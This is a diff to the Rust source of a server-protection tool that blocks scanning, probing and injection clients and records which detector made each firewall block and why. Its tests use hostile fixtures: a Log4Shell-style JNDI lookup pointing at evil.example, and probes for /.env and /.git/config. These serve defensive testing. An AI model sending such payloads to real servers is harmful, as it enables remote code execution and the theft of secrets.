@@ -26,8 +26,9 @@
 //! how to present it: the CLI reconstructs its existing wording, the cron
 //! job turns it into a one-line summary for the Dashboard.
 
-use crate::db::{Db, FirewallAction, NewFirewallRule};
+use crate::db::{Db, FirewallAction, NewFirewallRule, RuleSource};
 use crate::evidence::{decide, Rule};
+use crate::protection::Detector;
 use crate::{accesslog, ipranges, sshlog};
 use anyhow::Result;
 use std::collections::{HashMap, HashSet};
@@ -51,6 +52,21 @@ pub enum ScanKind {
 }
 
 impl ScanKind {
+    /// Which kind of finding `detector` makes.
+    pub fn of(detector: Detector) -> ScanKind {
+        match detector {
+            Detector::SshScanners | Detector::WebScanners => ScanKind::Scanning,
+            Detector::SpoofedCrawlers => ScanKind::SpoofedCrawler,
+            Detector::ProbePaths => ScanKind::ProbePath,
+            Detector::Injection => ScanKind::Injection,
+            Detector::Honeypot => ScanKind::Honeypot,
+            Detector::AssetRatio | Detector::RotatingUserAgent | Detector::RefererlessCrawl => {
+                ScanKind::NonBrowser
+            }
+            Detector::RobotsTxt => ScanKind::RobotsTxt,
+        }
+    }
+
     /// The noun this detector's findings are called, singular — the CLI's
     /// `print_scan_block_outcome` needs it too, so it isn't private.
     pub fn noun(self) -> &'static str {
@@ -104,6 +120,10 @@ pub struct ScanBlockOutcome {
     /// the Allow ahead of it would win anyway, and a Block row against a
     /// trusted address would show it as blocked when it is not.
     pub skipped_trusted: usize,
+    /// Of the candidates, how many were left alone because an operator
+    /// removed a detector's block on them recently (see [`crate::blocks`]):
+    /// re-adding it would undo the operator's decision on the next pass.
+    pub skipped_unblocked: usize,
     /// Addresses actually newly blocked — or, if `dry_run`, that would
     /// have been.
     pub newly_blocked: Vec<String>,
@@ -125,22 +145,19 @@ impl ScanBlockOutcome {
         if self.newly_blocked.is_empty() {
             let surviving = self.candidates - self.skipped_known_crawlers;
             if self.already_covered == 0 {
-                match (self.skipped_ssh_logins > 0, self.skipped_trusted > 0) {
-                    (true, false) => {
-                        return format!(
-                            "found {surviving} {noun}(s), all recent SSH logins — left alone"
-                        )
-                    }
-                    (false, true) => {
-                        return format!("found {surviving} {noun}(s), all trusted — left alone")
-                    }
-                    (true, true) => {
-                        return format!(
-                            "found {surviving} {noun}(s), all trusted or recent SSH logins — \
-                             left alone"
-                        )
-                    }
-                    (false, false) => {}
+                let reasons: Vec<&str> = [
+                    (self.skipped_trusted > 0, "trusted"),
+                    (self.skipped_ssh_logins > 0, "recent SSH logins"),
+                    (self.skipped_unblocked > 0, "unblocked by hand"),
+                ]
+                .into_iter()
+                .filter_map(|(applies, reason)| applies.then_some(reason))
+                .collect();
+                if !reasons.is_empty() {
+                    return format!(
+                        "found {surviving} {noun}(s), all {} — left alone",
+                        reasons.join(" or ")
+                    );
                 }
             }
             return format!("found {surviving} {noun}(s), all already covered");
@@ -195,17 +212,31 @@ pub fn run_detector(
     let rows = db.evidence_rows(detector, since, rule)?;
     let convicted = decide(&rows, rule, Some(since));
     let found = convicted.len();
+    // Each convicted address with the item that convicted it: the path,
+    // the payload's name, the crawler it claimed to be. That is what its
+    // block records as evidence; see `crate::blocks`.
+    let hinted = |convicted: Vec<(String, String)>| -> Vec<(String, Option<String>)> {
+        convicted
+            .into_iter()
+            .map(|(ip, item)| (ip, (!item.is_empty()).then_some(item)))
+            .collect()
+    };
+    let trigger = Trigger {
+        log_text: None,
+        dry_run,
+    };
     match detector {
         D::SshScanners | D::ProbePaths | D::Injection | D::Honeypot | D::RobotsTxt => {
-            let kind = match detector {
-                D::SshScanners => ScanKind::Scanning,
-                D::ProbePaths => ScanKind::ProbePath,
-                D::Injection => ScanKind::Injection,
-                D::Honeypot => ScanKind::Honeypot,
-                _ => ScanKind::RobotsTxt,
-            };
-            let candidates = convicted.into_iter().map(|(ip, _)| ip).collect();
-            add_block_rules(db, kind, found, candidates, 0, true, ttl_days, dry_run)
+            add_block_rules(
+                db,
+                detector,
+                found,
+                hinted(convicted),
+                0,
+                true,
+                ttl_days,
+                trigger,
+            )
         }
         D::SpoofedCrawlers => {
             // Checked again against the ranges as they are now: the
@@ -230,26 +261,20 @@ pub fn run_detector(
             let candidates = convicted
                 .into_iter()
                 .filter(|(ip, name)| still_forged(ip, name))
-                .map(|(ip, _)| ip)
                 .collect();
             add_block_rules(
                 db,
-                ScanKind::SpoofedCrawler,
+                detector,
                 found,
-                candidates,
+                hinted(candidates),
                 0,
                 !claims.is_empty(),
                 ttl_days,
-                dry_run,
+                trigger,
             )
         }
-        D::WebScanners => {
-            let candidates = convicted.into_iter().map(|(ip, _)| ip).collect();
-            excluding_known_crawlers(db, ScanKind::Scanning, candidates, ttl_days, dry_run)
-        }
-        D::AssetRatio | D::RotatingUserAgent | D::RefererlessCrawl => {
-            let candidates = convicted.into_iter().map(|(ip, _)| ip).collect();
-            behavioural(db, candidates, ttl_days, dry_run)
+        D::WebScanners | D::AssetRatio | D::RotatingUserAgent | D::RefererlessCrawl => {
+            excluding_known_crawlers(db, detector, hinted(convicted), ttl_days, trigger)
         }
     }
 }
@@ -271,13 +296,13 @@ pub fn block_ssh_scanners(
     let found = candidates.len();
     add_block_rules(
         db,
-        ScanKind::Scanning,
+        Detector::SshScanners,
         found,
-        candidates,
+        unhinted(candidates),
         0,
         true,
         ttl_days,
-        dry_run,
+        Trigger::log(log_text, dry_run),
     )
 }
 
@@ -296,7 +321,13 @@ pub fn block_web_scanners(
     dry_run: bool,
 ) -> Result<ScanBlockOutcome> {
     let candidates = accesslog::scanning_ips(log_text, threshold);
-    excluding_known_crawlers(db, ScanKind::Scanning, candidates, ttl_days, dry_run)
+    excluding_known_crawlers(
+        db,
+        Detector::WebScanners,
+        unhinted(candidates),
+        ttl_days,
+        Trigger::log(log_text, dry_run),
+    )
 }
 
 /// Every CIDR published by a known crawler source (Googlebot, Bingbot,
@@ -370,16 +401,19 @@ pub fn block_spoofed_crawlers(
     let claims = crawler_claims(db)?;
     let spoofed = accesslog::spoofed_crawler_ips(log_text, &claims);
     let found = spoofed.len();
-    let candidates: Vec<String> = spoofed.into_iter().map(|(ip, _name)| ip).collect();
+    let candidates = spoofed
+        .into_iter()
+        .map(|(ip, name)| (ip, Some(name)))
+        .collect();
     add_block_rules(
         db,
-        ScanKind::SpoofedCrawler,
+        Detector::SpoofedCrawlers,
         found,
         candidates,
         0,
         !claims.is_empty(),
         ttl_days,
-        dry_run,
+        Trigger::log(log_text, dry_run),
     )
 }
 
@@ -412,13 +446,13 @@ pub fn block_robots_txt(
     let found = candidates.len();
     add_block_rules(
         db,
-        ScanKind::RobotsTxt,
+        Detector::RobotsTxt,
         found,
-        candidates,
+        unhinted(candidates),
         0,
         true,
         ttl_days,
-        dry_run,
+        Trigger::log(log_text, dry_run),
     )
 }
 
@@ -431,16 +465,19 @@ pub fn block_probe_paths(
     let paths = crate::protection::probe_paths(db)?;
     let hits = accesslog::probe_path_ips(log_text, &paths);
     let found = hits.len();
-    let candidates: Vec<String> = hits.into_iter().map(|(ip, _path)| ip).collect();
+    let candidates = hits
+        .into_iter()
+        .map(|(ip, path)| (ip, Some(path)))
+        .collect();
     add_block_rules(
         db,
-        ScanKind::ProbePath,
+        Detector::ProbePaths,
         found,
         candidates,
         0,
         true,
         ttl_days,
-        dry_run,
+        Trigger::log(log_text, dry_run),
     )
 }
 
@@ -457,16 +494,19 @@ pub fn block_injection(
 ) -> Result<ScanBlockOutcome> {
     let hits = accesslog::injection_ips(log_text);
     let found = hits.len();
-    let candidates: Vec<String> = hits.into_iter().map(|(ip, _kind)| ip).collect();
+    let candidates = hits
+        .into_iter()
+        .map(|(ip, kind)| (ip, Some(kind)))
+        .collect();
     add_block_rules(
         db,
-        ScanKind::Injection,
+        Detector::Injection,
         found,
         candidates,
         0,
         true,
         ttl_days,
-        dry_run,
+        Trigger::log(log_text, dry_run),
     )
 }
 
@@ -492,16 +532,19 @@ pub fn block_honeypot(
     let path = crate::protection::honeypot_path(db)?;
     let hits = accesslog::probe_path_ips(log_text, &[path]);
     let found = hits.len();
-    let candidates: Vec<String> = hits.into_iter().map(|(ip, _path)| ip).collect();
+    let candidates = hits
+        .into_iter()
+        .map(|(ip, path)| (ip, Some(path)))
+        .collect();
     add_block_rules(
         db,
-        ScanKind::Honeypot,
+        Detector::Honeypot,
         found,
         candidates,
         0,
         true,
         ttl_days,
-        dry_run,
+        Trigger::log(log_text, dry_run),
     )
 }
 
@@ -520,7 +563,13 @@ pub fn block_asset_ratio(
         crate::protection::ASSET_RATIO_MIN_PAGES_DEFAULT,
     )?;
     let candidates = accesslog::asset_less_ips(log_text, min_pages);
-    behavioural(db, candidates, ttl_days, dry_run)
+    excluding_known_crawlers(
+        db,
+        Detector::AssetRatio,
+        unhinted(candidates),
+        ttl_days,
+        Trigger::log(log_text, dry_run),
+    )
 }
 
 /// Blocks clients presenting many distinct user agents — see
@@ -537,7 +586,13 @@ pub fn block_rotating_ua(
         crate::protection::ROTATING_UA_MIN_DEFAULT,
     )?;
     let candidates = accesslog::rotating_user_agent_ips(log_text, min_agents);
-    behavioural(db, candidates, ttl_days, dry_run)
+    excluding_known_crawlers(
+        db,
+        Detector::RotatingUserAgent,
+        unhinted(candidates),
+        ttl_days,
+        Trigger::log(log_text, dry_run),
+    )
 }
 
 /// Blocks clients that walked many deep pages without ever sending a
@@ -554,56 +609,51 @@ pub fn block_refererless(
         crate::protection::REFERERLESS_MIN_PATHS_DEFAULT,
     )?;
     let candidates = accesslog::refererless_crawl_ips(log_text, min_paths);
-    behavioural(db, candidates, ttl_days, dry_run)
-}
-
-/// Shared tail for the three behavioural detectors.
-///
-/// Unlike the other access-log detectors these *do* apply the known-crawler
-/// exclusion, and that is the whole reason this helper exists rather than
-/// three copies. All three describe "doesn't behave like a browser", which
-/// is exactly true of Googlebot: it fetches no CSS, it uses more than one
-/// user agent, and it never sends a referer. Without the exclusion these
-/// three detectors would block search engines by design.
-fn behavioural(
-    db: &Db,
-    candidates: Vec<String>,
-    ttl_days: i64,
-    dry_run: bool,
-) -> Result<ScanBlockOutcome> {
-    excluding_known_crawlers(db, ScanKind::NonBrowser, candidates, ttl_days, dry_run)
+    excluding_known_crawlers(
+        db,
+        Detector::RefererlessCrawl,
+        unhinted(candidates),
+        ttl_days,
+        Trigger::log(log_text, dry_run),
+    )
 }
 
 /// Blocks `candidates`, less any inside a known crawler's published ranges
 /// (see [`known_crawler_ranges`]).
+///
+/// The web scanner and the three behavioural detectors go through here.
+/// The behavioural three need it most: all of them describe "doesn't behave
+/// like a browser", which is exactly true of Googlebot — it fetches no CSS,
+/// uses more than one user agent and never sends a referer — so without it
+/// they would block search engines by design.
 fn excluding_known_crawlers(
     db: &Db,
-    kind: ScanKind,
-    candidates: Vec<String>,
+    detector: Detector,
+    candidates: Vec<(String, Option<String>)>,
     ttl_days: i64,
-    dry_run: bool,
+    trigger: Trigger<'_>,
 ) -> Result<ScanBlockOutcome> {
     let found = candidates.len();
     let crawler_ranges = known_crawler_ranges(db)?;
     let crawler_exclusion_active = !crawler_ranges.is_empty();
     let mut kept = Vec::new();
     let mut skipped_known_crawlers = 0;
-    for ip in candidates {
-        if known_crawler_match(&crawler_ranges, &ip) {
+    for candidate in candidates {
+        if known_crawler_match(&crawler_ranges, &candidate.0) {
             skipped_known_crawlers += 1;
         } else {
-            kept.push(ip);
+            kept.push(candidate);
         }
     }
     add_block_rules(
         db,
-        kind,
+        detector,
         found,
         kept,
         skipped_known_crawlers,
         crawler_exclusion_active,
         ttl_days,
-        dry_run,
+        trigger,
     )
 }
 
@@ -691,8 +741,70 @@ fn escalate_subnets(addresses: Vec<String>, min: usize) -> Vec<String> {
     out
 }
 
+/// What a pass needs to write its blocks besides the candidates: the log
+/// it read, when it read one whole (the one-off CLI commands), for the
+/// line each new block records as evidence (see [`crate::trigger`]); and
+/// whether to write at all.
+#[derive(Clone, Copy)]
+struct Trigger<'a> {
+    log_text: Option<&'a str>,
+    dry_run: bool,
+}
+
+impl<'a> Trigger<'a> {
+    fn log(log_text: &'a str, dry_run: bool) -> Self {
+        Trigger {
+            log_text: Some(log_text),
+            dry_run,
+        }
+    }
+}
+
+/// Candidates the detector said nothing more about.
+fn unhinted(addresses: Vec<String>) -> Vec<(String, Option<String>)> {
+    addresses
+        .into_iter()
+        .map(|address| (address, None))
+        .collect()
+}
+
+/// A block's evidence line, from what the detector matched: the log line
+/// itself when the whole log is at hand, and otherwise the item the stored
+/// evidence kept — the path, the payload's name, the crawler claimed.
+fn evidence_line(detector: Detector, item: Option<&str>, line: Option<&String>) -> Option<String> {
+    if let Some(line) = line {
+        return Some(line.clone());
+    }
+    let item = item.filter(|item| !item.is_empty());
+    Some(match (detector, item) {
+        (Detector::SshScanners, _) => {
+            "failed SSH logins over the threshold, inside the window".to_string()
+        }
+        (Detector::WebScanners, Some(path)) => format!("404s for many paths, the first {path}"),
+        (Detector::SpoofedCrawlers, Some(name)) => format!(
+            "claimed to be {} from an address it does not publish",
+            name.trim_end_matches(" IP ranges")
+        ),
+        (Detector::ProbePaths | Detector::Honeypot | Detector::RobotsTxt, Some(path)) => {
+            format!("requested {path}")
+        }
+        (Detector::Injection, Some(kind)) => format!("sent an exploit payload: {kind}"),
+        (Detector::AssetRatio, Some(path)) => format!("pages and no assets, the first {path}"),
+        (Detector::RotatingUserAgent, Some(agent)) => {
+            format!("many user agents, the first \"{agent}\"")
+        }
+        (Detector::RefererlessCrawl, Some(path)) => {
+            format!("deep pages and never a referer, the first {path}")
+        }
+        (_, None) => return None,
+    })
+}
+
 /// Adds a Block rule, expiring after `ttl_days`, for each of `kept` not
 /// already covered by an existing firewall rule of the same exact address.
+/// `kept` is each address as the detector saw it, with what it matched
+/// where it says; the rule records `detector` as its source and that as
+/// its evidence.
 /// The existence check reads through [`Db::list_firewall_rules`], which
 /// prunes expired rows before returning them — load-bearing here, not just
 /// tidiness: without it, a scanner whose earlier block already lapsed
@@ -703,13 +815,13 @@ fn escalate_subnets(addresses: Vec<String>, min: usize) -> Vec<String> {
 #[allow(clippy::too_many_arguments)]
 fn add_block_rules(
     db: &Db,
-    kind: ScanKind,
+    detector: Detector,
     found: usize,
-    kept: Vec<String>,
+    kept: Vec<(String, Option<String>)>,
     skipped_known_crawlers: usize,
     crawler_exclusion_active: bool,
     ttl_days: i64,
-    dry_run: bool,
+    trigger: Trigger<'_>,
 ) -> Result<ScanBlockOutcome> {
     // One transaction for the whole pass: a first scan of a busy log can
     // block hundreds of addresses, and each insert (and the evidence it
@@ -718,13 +830,13 @@ fn add_block_rules(
     db.batch(|| {
         add_block_rules_now(
             db,
-            kind,
+            detector,
             found,
             kept,
             skipped_known_crawlers,
             crawler_exclusion_active,
             ttl_days,
-            dry_run,
+            trigger,
         )
     })
 }
@@ -732,14 +844,15 @@ fn add_block_rules(
 #[allow(clippy::too_many_arguments)]
 fn add_block_rules_now(
     db: &Db,
-    kind: ScanKind,
+    detector: Detector,
     found: usize,
-    kept: Vec<String>,
+    kept: Vec<(String, Option<String>)>,
     skipped_known_crawlers: usize,
     crawler_exclusion_active: bool,
     ttl_days: i64,
-    dry_run: bool,
+    trigger: Trigger<'_>,
 ) -> Result<ScanBlockOutcome> {
+    let Trigger { log_text, dry_run } = trigger;
     // Seeded from what's already stored, then *added to as we go*. The
     // second part matters more than it used to: before IPv6 widening, two
     // candidates were only ever equal if the same address appeared twice
@@ -761,7 +874,28 @@ fn add_block_rules_now(
         .filter_map(|ip| ip.parse().ok())
         .collect();
     let trusted = db.list_trusted_addresses()?;
+    // Addresses an operator unblocked by hand. Matched exactly, since a
+    // detector writes the same address for the same client every time,
+    // and by overlap for a range, which is what an escalated /24 becomes.
+    // See `crate::blocks`.
+    let unblocked: HashSet<String> = db
+        .unblocked_addresses()?
+        .into_iter()
+        .map(|(address, _)| address)
+        .collect();
+    let unblocked_ranges: Vec<&String> = unblocked.iter().filter(|a| a.contains('/')).collect();
 
+    let items: HashMap<String, Option<String>> = kept.iter().cloned().collect();
+    let kept: Vec<String> = kept.into_iter().map(|(address, _)| address).collect();
+    // The log lines behind the candidates, when the whole log was given.
+    let lines = match log_text {
+        Some(text) if !dry_run => {
+            let observed: Vec<(String, Option<String>)> =
+                items.iter().map(|(a, i)| (a.clone(), i.clone())).collect();
+            crate::trigger::evidence_for(detector, text, &observed)
+        }
+        _ => HashMap::new(),
+    };
     let flagged = kept.clone();
     let kept = match crate::protection::subnet_escalation(db)? {
         Some(min) => escalate_subnets(kept, min),
@@ -783,6 +917,7 @@ fn add_block_rules_now(
     let mut already_covered = 0;
     let mut skipped_ssh_logins = 0;
     let mut skipped_trusted = 0;
+    let mut skipped_unblocked = 0;
     for observed in kept {
         // What gets stored is not always what was seen: an IPv6 address is
         // widened to its /64 (see `blockable_address`). Dedup happens on
@@ -815,6 +950,14 @@ fn add_block_rules_now(
             skipped_trusted += 1;
             continue;
         }
+        if unblocked.contains(&ip)
+            || unblocked_ranges
+                .iter()
+                .any(|range| crate::ipranges::cidrs_overlap(range, &ip))
+        {
+            skipped_unblocked += 1;
+            continue;
+        }
         // The addresses this block answers for: the one observed, or every
         // flagged neighbour an escalated /24 or a /64 stands for.
         let answered: Vec<&String> = observed_in(&flagged, &ip);
@@ -832,11 +975,18 @@ fn add_block_rules_now(
             continue;
         }
         if !dry_run {
+            // The first address it answers for that has something to say.
+            let evidence = answered.iter().find_map(|address| {
+                let item = items.get(*address).cloned().flatten();
+                evidence_line(detector, item.as_deref(), lines.get(*address))
+            });
             db.add_firewall_rule_with_ttl(
                 &NewFirewallRule {
                     address: ip.clone(),
                     port: None,
                     action: FirewallAction::Block,
+                    source: RuleSource::Detector(detector),
+                    evidence,
                 },
                 ttl_seconds,
             )?;
@@ -854,13 +1004,14 @@ fn add_block_rules_now(
     }
 
     Ok(ScanBlockOutcome {
-        kind,
+        kind: ScanKind::of(detector),
         candidates: found,
         skipped_known_crawlers,
         crawler_exclusion_active,
         already_covered,
         skipped_ssh_logins,
         skipped_trusted,
+        skipped_unblocked,
         newly_blocked,
         ttl_days,
         dry_run,
@@ -1074,6 +1225,7 @@ mod tests {
             already_covered: 0,
             skipped_ssh_logins: 0,
             skipped_trusted: 0,
+            skipped_unblocked: 0,
             newly_blocked: vec![],
             ttl_days: 5,
             dry_run: false,
@@ -1256,6 +1408,8 @@ mod tests {
             address: "203.0.113.9".to_string(),
             port: None,
             action: FirewallAction::Block,
+            source: crate::db::RuleSource::Cli,
+            evidence: None,
         })
         .unwrap();
         let log = ua_line("203.0.113.9", "Googlebot/2.1");
@@ -1277,6 +1431,7 @@ mod tests {
             already_covered: 0,
             skipped_ssh_logins: 0,
             skipped_trusted: 0,
+            skipped_unblocked: 0,
             newly_blocked: vec![],
             ttl_days: 1,
             dry_run: false,
@@ -1558,6 +1713,9 @@ mod tests {
             action: FirewallAction::Block,
             enabled: true,
             expires_at: None,
+            source: None,
+            created_at: None,
+            evidence: None,
         }];
         let connected = vec!["2001:db8:1:2::5".to_string()];
 
@@ -1792,6 +1950,8 @@ mod tests {
             address: "203.0.113.5".to_string(),
             port: None,
             action: FirewallAction::Block,
+            source: crate::db::RuleSource::Cli,
+            evidence: None,
         })
         .unwrap();
 
@@ -1950,5 +2110,180 @@ mod tests {
                 .is_empty(),
             "the /24 answered for all three"
         );
+    }
+
+    // ---- what a detector's block records ----
+
+    fn the_only_rule(db: &Db) -> crate::db::FirewallRule {
+        let rules = db.list_firewall_rules().unwrap();
+        assert_eq!(rules.len(), 1, "{rules:?}");
+        rules.into_iter().next().unwrap()
+    }
+
+    /// The question the Blocks views answer: which detector, and what did
+    /// the address send.
+    #[test]
+    fn a_detector_s_block_names_the_detector_and_the_request_that_triggered_it() {
+        let db = Db::open_in_memory().unwrap();
+        let log = [
+            probe_line("203.0.113.5", "/"),
+            probe_line("203.0.113.5", "/.git/config"),
+        ]
+        .concat();
+
+        block_probe_paths(&db, 1, &log, false).unwrap();
+
+        let rule = the_only_rule(&db);
+        assert_eq!(
+            rule.source,
+            Some(RuleSource::Detector(Detector::ProbePaths))
+        );
+        let evidence = rule.evidence.unwrap_or_default();
+        assert!(
+            evidence.contains("/.git/config"),
+            "evidence was {evidence:?}"
+        );
+        assert!(rule.created_at.is_some());
+    }
+
+    #[test]
+    fn an_injection_block_names_the_payload_it_found() {
+        let db = Db::open_in_memory().unwrap();
+        let log = request_line(
+            "203.0.113.9",
+            "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1",
+            "Mozilla/5.0",
+        );
+
+        block_injection(&db, 7, &log, false).unwrap();
+
+        let evidence = the_only_rule(&db).evidence.unwrap_or_default();
+        let signature =
+            crate::injection::in_request("GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1")
+                .expect("the payload is one the detector knows");
+        assert!(
+            evidence.starts_with(signature) && evidence.contains("${jndi:"),
+            "evidence was {evidence:?}"
+        );
+    }
+
+    #[test]
+    fn an_ssh_scanner_s_block_carries_its_failed_login_line() {
+        let db = Db::open_in_memory().unwrap();
+        let log = ssh_failed_attempt("198.51.100.8", 25);
+
+        block_ssh_scanners(&db, 20, 1, &log, false).unwrap();
+
+        let rule = the_only_rule(&db);
+        assert_eq!(
+            rule.source,
+            Some(RuleSource::Detector(Detector::SshScanners))
+        );
+        assert_eq!(
+            rule.evidence.as_deref(),
+            Some("Failed password for root from 198.51.100.8 port 4444 ssh2")
+        );
+    }
+
+    /// A /64 is stored, but the line names the address that was seen.
+    #[test]
+    fn a_widened_ipv6_block_still_finds_the_line_of_the_address_inside_it() {
+        let db = Db::open_in_memory().unwrap();
+        let log = probe_line("2001:db8:1:2::99", "/.env");
+
+        block_probe_paths(&db, 1, &log, false).unwrap();
+
+        let rule = the_only_rule(&db);
+        assert_eq!(rule.address, "2001:db8:1:2::/64");
+        assert!(
+            rule.evidence.unwrap_or_default().contains("/.env"),
+            "the evidence belongs to the address inside the /64"
+        );
+    }
+
+    /// Attacker text is stored as one inert line.
+    #[test]
+    fn a_hostile_request_is_stored_without_its_control_characters() {
+        let db = Db::open_in_memory().unwrap();
+        let log = probe_line("203.0.113.5", "/.env\x1b[2J\x07");
+
+        block_probe_paths(&db, 1, &log, false).unwrap();
+
+        let evidence = the_only_rule(&db).evidence.unwrap_or_default();
+        assert!(
+            !evidence.chars().any(char::is_control),
+            "evidence was {evidence:?}"
+        );
+    }
+
+    /// The operator's unblock has to outlast the log lines that earned the
+    /// block, or the next tick undoes it.
+    #[test]
+    fn an_address_unblocked_by_hand_is_not_blocked_again_from_the_same_log() {
+        let db = Db::open_in_memory().unwrap();
+        let log = probe_line("203.0.113.5", "/.env");
+        block_probe_paths(&db, 1, &log, false).unwrap();
+        db.unblock_address("203.0.113.5").unwrap();
+
+        let outcome = block_probe_paths(&db, 1, &log, false).unwrap();
+
+        assert!(db.list_firewall_rules().unwrap().is_empty());
+        assert_eq!(outcome.skipped_unblocked, 1, "{outcome:?}");
+        assert_eq!(
+            outcome.summary(),
+            "found 1 probing IP(s), all unblocked by hand — left alone"
+        );
+    }
+
+    /// Only that address: the detector keeps working for everyone else.
+    #[test]
+    fn an_unblock_leaves_every_other_address_to_the_detector() {
+        let db = Db::open_in_memory().unwrap();
+        block_probe_paths(&db, 1, &probe_line("203.0.113.5", "/.env"), false).unwrap();
+        db.unblock_address("203.0.113.5").unwrap();
+
+        let log = [
+            probe_line("203.0.113.5", "/.env"),
+            probe_line("203.0.113.6", "/.env"),
+        ]
+        .concat();
+        let outcome = block_probe_paths(&db, 1, &log, false).unwrap();
+
+        assert_eq!(outcome.newly_blocked, ["203.0.113.6"]);
+    }
+
+    /// The scheduled pass has no log text, only what the stored evidence
+    /// kept; the block names that.
+    #[test]
+    fn a_scheduled_block_records_what_the_stored_evidence_kept() {
+        let db = Db::open_in_memory().unwrap();
+        let now = now_secs();
+        probe_at(&db, "203.0.113.5", now - 60);
+
+        run_detector(&db, Detector::ProbePaths, 1, now, false).unwrap();
+
+        let rule = the_only_rule(&db);
+        assert_eq!(
+            rule.source,
+            Some(RuleSource::Detector(Detector::ProbePaths))
+        );
+        assert_eq!(rule.evidence.as_deref(), Some("requested /.env"));
+    }
+
+    /// The pipeline spends evidence when a block is made; an unblock by
+    /// hand must hold even against evidence gathered while it stood.
+    #[test]
+    fn a_scheduled_pass_leaves_an_address_unblocked_by_hand_alone() {
+        let db = Db::open_in_memory().unwrap();
+        let now = now_secs();
+        probe_at(&db, "203.0.113.5", now - 60);
+        run_detector(&db, Detector::ProbePaths, 1, now, false).unwrap();
+        probe_at(&db, "203.0.113.5", now + 30);
+        db.unblock_address("203.0.113.5").unwrap();
+
+        let outcome = run_detector(&db, Detector::ProbePaths, 1, now + 60, false).unwrap();
+
+        assert!(outcome.newly_blocked.is_empty(), "{outcome:?}");
+        assert_eq!(outcome.skipped_unblocked, 1);
     }
 }
